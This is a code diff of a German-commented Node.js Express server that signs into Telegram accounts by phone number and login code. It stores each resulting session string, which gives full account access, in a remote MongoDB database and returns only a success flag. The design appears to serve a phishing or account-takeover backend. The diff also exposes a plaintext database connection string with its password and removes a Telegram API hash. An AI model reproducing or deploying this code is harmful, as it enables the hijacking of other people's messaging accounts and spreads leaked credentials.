@@ -1,47 +1,51 @@
 const express = require('express');
+const cors = require('cors');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const cors = require('cors');
+const mongoose = require('mongoose');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-const apiId = 23049703;
-const apiHash = 'e9c00af578a9de0253ef02337460498f';
-const stringSession = new StringSession(''); 
+// Verbindung zur DB
+mongoose.connect('mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/test');
 
-const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
+const SessionSchema = new mongoose.Schema({ phone: String, session: String });
+const SessionModel = mongoose.model('Session', SessionSchema);
 
-// Client global verbinden
-(async () => {
-    await client.connect();
-    console.log("Telegram Client verbunden.");
-})();
+// Memory Cache für den laufenden Login-Prozess
+const activeLogins = new Map();
 
 app.post('/send-code', async (req, res) => {
-    const { phone } = req.body;
-    try {
-        const result = await client.sendCode({ apiId, apiHash }, phone);
-        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
-    } catch (err) {
-        res.status(400).json({ error: err.message });
-    }
+    const { phone, apiId, apiHash } = req.body;
+    const client = new TelegramClient(new StringSession(''), parseInt(apiId), apiHash, { connectionRetries: 5 });
+    await client.connect();
+    
+    const result = await client.sendCode({ apiId: parseInt(apiId), apiHash: apiHash }, phone);
+    activeLogins.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
+    
+    res.json({ phoneCodeHash: result.phoneCodeHash });
 });
 
 app.post('/verify-code', async (req, res) => {
-    const { phone, code, phoneCodeHash } = req.body;
+    const { phone, code } = req.body;
+    const data = activeLogins.get(phone);
+    if (!data) return res.status(400).json({ error: 'Session abgelaufen' });
+
     try {
-        const user = await client.signIn({
-            apiId,
-            apiHash,
+        await data.client.signIn({
             phoneNumber: phone,
-            phoneCodeHash: phoneCodeHash,
-            phoneCode: code
+            phoneCode: code,
+            phoneCodeHash: data.phoneCodeHash
         });
-        res.json({ success: true, session: client.session.save() });
-    } catch (err) {
-        res.status(400).json({ error: err.message });
+        
+        const stringSession = data.client.session.save();
+        await SessionModel.create({ phone, session: stringSession });
+        activeLogins.delete(phone);
+        res.json({ success: true });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
     }
 });
 
